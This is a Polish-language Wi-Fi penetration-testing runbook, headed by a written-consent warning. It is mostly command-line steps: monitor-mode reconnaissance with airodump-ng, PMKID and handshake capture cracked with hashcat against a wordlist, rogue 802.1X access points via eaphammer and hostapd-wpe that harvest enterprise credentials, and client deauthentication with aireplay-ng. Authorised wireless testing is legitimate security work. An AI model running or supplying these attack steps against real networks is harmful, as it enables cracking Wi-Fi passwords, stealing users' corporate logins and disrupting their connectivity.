# Wi‑Fi Pentest CLI Runbook (wlan1)

> Używaj **tylko z pisemną zgodą**. Zachowaj limity EIRP i przepisy kraju.

## 0) Jednorazowy setup (po świeżej instalacji)
```bash
sudo apt update && sudo apt -y full-upgrade
sudo apt -y install tmux git curl jq build-essential dkms linux-headers-$(uname -r) \
  aircrack-ng kismet hcxdumptool hcxtools hashcat hostapd-wpe tshark network-manager
mkdir -p ~/wifi/{pcap,logs,hashes,notes}
sudo iw reg set PL
```

## 1) Auto‑prep + smoke tests
```bash
# pobierz skrypty (po wrzuceniu na GitHub zamień ścieżki na swoją repo)
chmod +x wifi_prep_wlan1.sh wifi_teardown.sh
sudo ./wifi_prep_wlan1.sh wlan1
```
Co robi:
- zabija NM/wpa_supplicant
- przełącza **wlan1** w monitor
- (opcjonalnie CH=$CH ustawia kanał)
- robi **tcpdump 200 ramek**, test **injection**, 30s survey

## 2) Rekonesans
```bash
sudo airodump-ng wlan1
# target (statyczny kanał)
sudo airodump-ng -c <CH> --bssid <AP_BSSID> -w ~/wifi/pcap/target wlan1
```

## 3) WPA‑Personal (PMKID/4way → hashcat)
```bash
sudo iw dev wlan1 set channel <CH>
sudo hcxdumptool -i wlan1 -o ~/wifi/pcap/cap.pcapng --enable_status=1
hcxpcapngtool -o ~/wifi/hashes/psk.22000 ~/wifi/pcap/cap.pcapng
hashcat -m 22000 ~/wifi/hashes/psk.22000 /usr/share/wordlists/rockyou.txt -O
```

## 4) WPA‑Enterprise (rogue 802.1X — tylko w scope!)
### EAPHammer (auto)
```bash
sudo apt -y install eaphammer
sudo ip link set wlan1 down && sudo iw dev wlan1 set type managed && sudo ip link set wlan1 up
sudo eaphammer --interface wlan1 --channel <CH> --essid "<CORP_SSID>" --auth wpa-eap --creds
```
### hostapd‑wpe (manual)
```bash
sudo cp -r /etc/hostapd-wpe ~/wifi/hostapd-wpe
sudo nano ~/wifi/hostapd-wpe/hostapd-wpe.conf   # wstaw ssid, channel, interface=wlan1
sudo hostapd-wpe ~/wifi/hostapd-wpe/hostapd-wpe.conf | tee ~/wifi/logs/hostapd-wpe_$(date +%F_%H%M).log
```

## 5) Deauth / PMF check (jeśli dozwolone)
```bash
sudo aireplay-ng --deauth 10 -a <AP_BSSID> -c <STA_BSSID> wlan1
# jeśli PMF=Required — deauth nie zadziała (pozytywny wynik dla klienta)
```

## 6) Pakowanie artefaktów i przywrócenie sieci
```bash
tar czvf ~/wifi_artifacts_$(date +%F_%H%M).tgz ~/wifi
sudo ./wifi_teardown.sh wlan1
```

## Diagnostyka interfejsów
```bash
for i in $(ls /sys/class/net | grep -E '^wl'); do
  echo "=== $i ==="
  ethtool -i $i 2>/dev/null | grep -E 'driver|bus-info'
done
iw dev wlan1 info | grep txpower        # np. 20.00 dBm
```

**Uwagi**
- Internet nie jest potrzebny do samej akwizycji RF; odłącz NM na czas testów.
- CH=<kanał> ustaw stały kanał celu; skakanie kanałów psuje handshaki.
- Nie przekraczaj limitów mocy — `iw reg get` pokaże reguły dla PL.
